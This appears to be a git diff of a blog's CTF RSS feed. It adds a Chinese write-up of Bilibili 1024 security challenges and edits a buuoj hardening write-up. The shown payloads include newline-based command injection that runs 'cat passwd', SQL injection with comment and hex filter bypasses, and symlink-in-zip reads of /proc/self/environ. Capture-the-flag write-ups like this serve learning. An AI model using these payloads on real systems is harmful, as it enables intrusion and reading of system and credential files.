@@ -1,4 +1,71 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 07 Nov 2021 08:57:29 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 14 Nov 2021 20:15:47 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Bilibili 1024安全攻防 Wp</title><link>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</link><pubDate>Sun, 14 Nov 2021 20:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</guid><description>&lt;h2 id="安全攻防--1">安全攻防&amp;ndash;1&lt;/h2>
+&lt;blockquote>
+&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/r1.html">https://security.bilibili.com/sec1024/q/r1.html&lt;/a> | &lt;a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774">提示&lt;/a>&lt;/p>
+&lt;p>1024程序员节，大家一起和2233参与解密游戏吧~
+happy_1024_2233:
+e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
+0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154001444.png" alt="image-20211114154001444">&lt;/p>
+&lt;p>&lt;code>a1cd5f84-27966146-3776f301-64031bb9&lt;/code>&lt;/p>
+&lt;h2 id="安全攻防--2">安全攻防&amp;ndash;2&lt;/h2>
+&lt;blockquote>
+&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://cli.vuejs.org/zh/config/#productionsourcemap">提示&lt;/a>&lt;/p>
+&lt;p>某高级前端开发攻城狮更改了一个前端配置项&lt;/p>
+&lt;/blockquote>
+&lt;p>提示中给的是vue的官方文档，并且定位到了productionSourceMap&lt;/p>
+&lt;p>来一波f12&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154330638.png" alt="image-20211114154330638">&lt;/p>
+&lt;p>&lt;code>36c7a7b4-cda04af0-8db0368d-b5166480&lt;/code>&lt;/p>
+&lt;h2 id="安全攻防--3">安全攻防&amp;ndash;3&lt;/h2>
+&lt;blockquote>
+&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/eval.zip">https://security.bilibili.com/sec1024/q/eval.zip&lt;/a> | &lt;a href="https://www.php.net/manual/zh/function.preg-match.php">提示&lt;/a>&lt;/p>
+&lt;p>PHP is the best language for web programming, but what about other languages?&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#75715e">/*
+&lt;/span>&lt;span style="color:#75715e"> bilibili- ( ゜- ゜)つロ 乾杯~
+&lt;/span>&lt;span style="color:#75715e"> uat: http://192.168.3.2/uat/eval.php
+&lt;/span>&lt;span style="color:#75715e"> pro: http://security.bilibili.com/sec1024/q/pro/eval.php
+&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
+&lt;span style="color:#111">$args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;args&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\w+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">// todo: other filter
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/bin/2233 &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以get方式接收最多3个名为args的参数，对每个参数的值进行正则匹配，最后拼接到$cmd后面被exec执行，用%0a换行+数组[]绕过&lt;/p>
+&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=ls
+https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=cat&amp;amp;args[]=passwd
+&lt;/code>&lt;/pre>&lt;p>&lt;code>9d3c3014-6c6267e7-086aaee5-1f18452a&lt;/code>&lt;/p>
+&lt;h2 id="安全攻防--4">安全攻防&amp;ndash;4&lt;/h2>
+&lt;blockquote>
+&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289">提示&lt;/a>&lt;/p>
+&lt;p>懂的都懂&lt;/p>
+&lt;/blockquote>
+&lt;p>有个请求api &lt;a href="https://security.bilibili.com/sec1024/q/admin/api/v1/log/list">https://security.bilibili.com/sec1024/q/admin/api/v1/log/list&lt;/a>，本能的去fuzz一下，结果412了……QAQ&lt;/p>
+&lt;p>username部分可以sqli，过滤了空格和单引号，用注释和16进制绕过&lt;/p>
+&lt;p>payload&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,5&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>3d5dd579-0678ef93-18b70cae-cabc5d51&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>难度应该算是偏简单的，就是，emmmmmmmmmm&lt;/p>
+&lt;p>算了，我不好说&lt;/p></description></item><item><title>buuoj加固题 Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuoj新上了加固题这个分类，也就是线下awdp中fix的部分，只要将靶机中存在的漏洞修复好并通过check的检测即可拿到flag；有一说一，比单纯attack拿flag会简单很多（适合我这种沸物web&lt;/p>
 &lt;p>下面的wp会先说纯修复角度，再串一下整体的知识点；因为自己水平有限，想尽可能说的清楚一些就会比较啰嗦，见谅QAQ&lt;/p>
 &lt;h2 id="ezsql">Ezsql&lt;/h2>
 &lt;h3 id="fix">FIX&lt;/h3>
@@ -35,9 +102,10 @@
 &lt;h3 id="考点二--linux软链接文件读取zip压缩包">考点二 · linux软链接文件读取&amp;amp;zip压缩包&lt;/h3>
 &lt;p>ln -s是linux中的软链接命令，我们可以制作对应文件的绝对路径的软链接来读文件；当不知道flask工作目录可以使用&lt;code>/proc/self/cwd&lt;/code>来指向当前进程的目录&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;[网鼎杯 2020 白虎组]PicDown&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者通过&lt;code>/proc/self/environ&lt;/code>文件里包含进程的环境变量，可以从中获取flask的绝对路径，再制作软链接（关于/proc的更多信息可以参见-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/proc目录的妙用&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCE利用总结&lt;/a>，题-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[网鼎杯 2020 白虎组]PicDown&lt;/a>&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的（参考-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>而对于目录内文件的列举也是有方法的，参见-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF Web题 extract0r Writeup&lt;/a>&lt;/p>
+&lt;p>甚至也可以写入shell，参见-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[深育杯 2021]Zipzip&lt;/a>&lt;/p>
 &lt;p>制作好的软链接通过zip打包&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>更多题目中的应用可以参见-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">记录一道题的多种解法&lt;/a>&lt;/p>
@@ -60,10 +128,10 @@
 &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
 &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
 &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 /proc/self/environ
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
 python3 exp.py /app/y0u_found_it.ini
-python3 /app/y0u_found_it/y0u_found_it_main.py
-python3 /sys/class/net/eth0/address
+python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
+python3 exp.py /sys/class/net/eth0/address
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
 &lt;p>exp.py - 2 根据mac地址生成伪随机数&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
